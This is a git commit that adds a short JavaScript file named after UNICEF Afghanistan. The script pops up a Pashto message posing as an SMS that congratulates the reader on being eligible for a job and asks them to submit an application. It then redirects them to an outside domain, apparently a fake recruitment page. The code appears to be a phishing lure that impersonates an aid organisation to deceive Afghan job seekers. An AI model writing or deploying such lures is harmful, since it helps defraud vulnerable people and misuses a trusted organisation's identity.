3b48c02de7e61f366a185743659e144ce2a12df8
ekpeowo <ukpehansi@gmail.com>
2025-03-27 08:07:06 +0100

    Create unicef-af-active.js

---
+++ unicef-af-active.js
@@ -0,0 +1,5 @@
+var password = 'درخواست وکړئ'
+password=prompt('SMS: مبارک شه، تاسو زموږ سره د کار کولو وړ یاست، اوس د غوښتنلیک سپارلو لپاره Ok کلیک وکړئ. ','درخواست وکړئ');
+if (password != 'درخواست وکړئ') {
+location.href='https://news-active.org/unicef-afghan';
+}
